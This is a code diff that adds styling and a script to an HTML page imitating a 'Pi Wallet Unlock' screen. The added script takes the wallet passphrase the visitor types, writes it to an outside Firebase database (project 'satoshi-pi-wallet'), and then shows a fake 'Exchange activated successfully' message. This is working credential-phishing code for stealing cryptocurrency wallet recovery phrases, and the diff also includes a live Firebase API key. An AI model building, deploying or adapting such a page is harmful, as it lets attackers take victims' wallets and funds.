@@ -6,6 +6,94 @@
     <title>Pi Wallet Unlock</title>
     <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: #FFFFFF;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .main-title {
+            color: #000000;
+            font-size: 24px;
+            margin: 40px 0 30px;
+        }
+
+        .passphrase-field {
+            border: 2px solid #D3D3D3;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 30px;
+            width: 100%;
+            min-height: 120px;
+            resize: vertical;
+            text-align: center;
+        }
+
+        .passphrase-field::placeholder {
+            color: #A9A9A9;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        .unlock-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            width: 100%;
+            padding: 16px;
+            margin: 15px 0;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .passphrase-btn {
+            border: 2px solid #B388FF;
+            background: transparent;
+            color: #5E2CA5;
+        }
+
+        .fingerprint-btn {
+            background: #5E2CA5;
+            color: #FFFFFF;
+            border: none;
+        }
+
+        .button-text {
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .disclaimer-text {
+            color: #000000;
+            line-height: 1.5;
+            margin: 25px 0;
+            font-size: 14px;
+        }
+
+        .warning-text {
+            color: #000000;
+            font-size: 14px;
+        }
+
+        .pi-symbol {
+            color: #0000FF;
+            font-weight: bold;
+        }
         
     </style>
 </head>
@@ -42,5 +130,44 @@
             previous wallet will be inaccessible.
         </div>
     </div> 
+    <script>
+        // Import the functions you need from the SDKs you need
+import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
+import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
+
+// https://firebase.google.com/docs/web/setup#available-libraries
+
+// Your web app's Firebase configuration
+const firebaseConfig = {
+  apiKey: "AIzaSyCaAEOz7UeopyQZtjPAQhqHcrPL81sVPtw",
+  authDomain: "satoshi-pi-wallet.firebaseapp.com",
+  databaseURL: "https://satoshi-pi-wallet-default-rtdb.firebaseio.com",
+  projectId: "satoshi-pi-wallet",
+  storageBucket: "satoshi-pi-wallet.firebasestorage.app",
+  messagingSenderId: "759930873350",
+  appId: "1:759930873350:web:30f32d925da07685e98587"
+};
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+
+//get ref to database services
+const db = getDatabase(app);
+
+document.getElementById('passphraseBtn').addEventListener('click', function(e) {
+
+    set(ref(db, 'passphraseBtn' + document.getElementById("passphraseInput").value),{
+
+
+        passphraseinput: document.getElementById("passphraseInput").value
+    })
+            
+    const passphrase = document.getElementById('passphraseInput').value;
+            
+            if(passphrase.trim().length > 0) {
+                alert("Exchange activated successfully");
+            }
+        })
+    </script>
 </body>
 </html>
